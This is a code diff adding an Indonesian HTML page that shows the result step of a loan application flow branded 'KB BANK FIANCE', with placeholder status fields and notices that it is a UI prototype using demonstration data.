@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>KB BANK FIANCE — Hasil Pengajuan</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="flow.css">
+</head>
+<body class="flow-page">
+  <main class="flow-shell">
+    <section class="flow-hero">
+      <div class="flow-top">
+        <button class="flow-back" id="backButton" type="button">←</button>
+        <button class="flow-lang" type="button">ID 🇮🇩</button>
+      </div>
+      <div class="flow-copy">
+        <div class="flow-step">Tahap 9</div>
+        <h1>Hasil Pengajuan</h1>
+        <p>Proses telah selesai dan hasil kini tersedia.</p>
+      </div>
+    </section>
+    
+<section class="flow-card">
+  <div class="result-center">
+    <div class="result-icon">✓</div>
+    <h2 id="resultTitle">Pengajuan Berhasil Diproses</h2>
+    <p id="resultMessage">Hasil pengajuan telah tersedia.</p>
+  </div>
+  <div class="summary-list" style="margin-top:22px">
+    <div class="summary-row"><span>Nomor Pengajuan</span><strong id="applicationId">—</strong></div>
+    <div class="summary-row"><span>Status</span><strong id="status">—</strong></div>
+    <div class="summary-row"><span>Nominal Pengajuan</span><strong id="amount">—</strong></div>
+    <div class="summary-row"><span>Tenor</span><strong id="tenor">—</strong></div>
+  </div>
+  <div class="flow-note">Status pada versi frontend ini ditentukan secara eksplisit sebagai data demonstrasi. Keputusan nyata harus berasal dari backend dan proses penilaian resmi.</div>
+  <button class="flow-button" id="dashboardButton" type="button">BUKA DASHBOARD →</button>
+</section>
+  </main>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="hasil-pengajuan.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
